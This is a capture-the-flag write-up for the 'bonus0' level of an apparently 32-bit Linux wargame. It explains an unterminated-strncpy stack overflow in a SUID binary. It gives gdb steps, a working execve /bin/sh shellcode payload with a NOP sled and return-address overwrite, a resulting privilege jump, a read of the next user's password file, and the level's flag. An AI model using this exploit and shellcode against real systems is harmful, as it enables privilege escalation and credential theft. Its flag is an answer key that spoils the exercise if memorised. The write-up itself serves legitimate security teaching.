# Bonus 0

SUID **bonus1**. NX off (`GNU_STACK` is `RWE`), so injected shellcode runs. Bug: `strncpy(dest, buffer, 20)` with no terminator lets two 20-byte inputs run together and overflow `main`'s `buf`; the shellcode itself hides in `p()`'s own 4096-byte `buffer` since `a`/`b` are too small.

1. Find the offset (cyclic pattern as input 2, two separate writes since `p()` calls `read()` twice):
   ```
   (python -c 'print "0"*20'; sleep 0.3; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"'; sleep 0.3) | gdb -q -batch -ex run -ex 'p/x $eip' ./bonus0
   0x41336141 in ?? ()
   ```
   `"Aa3A"` → offset **9**.

2. Find `buffer`'s address (measure in the same terminal you'll run from, it shifts with the environment):
   ```
   gdb ./bonus0
   (gdb) b read
   (gdb) run
   (gdb) x/wx $esp+8
   0xbfffe674:     0xbfffe680
   (gdb) p/x *(int*)($esp+8) + 60
   $1 = 0xbfffe6bc
   ```
   Little-endian: `\xbc\xe6\xff\xbf`.

3. Run it (100-byte NOP sled + shellcode as input 1, `9 pad + target + 7 filler` as input 2):
   ```
   (python -c 'print "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; python -c 'print "A"*9 + "\xbc\xe6\xff\xbf" + "B"*7'; cat) | ./bonus0
   id
   uid=2010(bonus0) [...] euid=2011(bonus1) [...]
   cat /home/user/bonus1/.pass
   ```
   Segfault instead? Redo step 2 in this exact terminal and rebuild step 3, the address doesn't carry over between sessions.

Ready-made scripts: `Ressources/exploit.py` (pwntools, runs over SSH against the real target) and `Ressources/exploit_simple.py` (plain `struct.pack`, edit the address and run locally).

Flag: `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
